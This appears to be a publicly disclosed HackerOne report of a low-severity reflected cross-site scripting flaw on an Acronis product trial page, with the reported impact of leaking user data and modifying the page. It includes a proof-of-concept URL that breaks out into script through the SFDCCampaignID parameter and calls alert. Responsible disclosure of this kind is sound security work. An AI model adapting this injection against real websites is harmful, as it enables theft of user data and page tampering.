# Reflected XSS in https://www.acronis.com/products/cyber-protect/trial/

## Report Details
- **Report ID**: 1891926
- **URL**: https://hackerone.com/reports/1891926
- **State**: Closed
- **Severity**: low
- **Submitted**: 2023-03-04T08:43:03.652Z
- **Disclosed**: 2024-11-20T08:19:36.918Z

## Reporter
- **Username**: tomblorg
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: acronis

## Vulnerability Information
Enter:
https://www.acronis.com/products/cyber-protect/trial/?SFDCCampaignID=zz`;(alert)();//

* will only work outside of USA (I've tried several countries with VPN)

## Impact

Leaking users data and and modify the webpage.

## Attachments
- arconis-xss.JPG
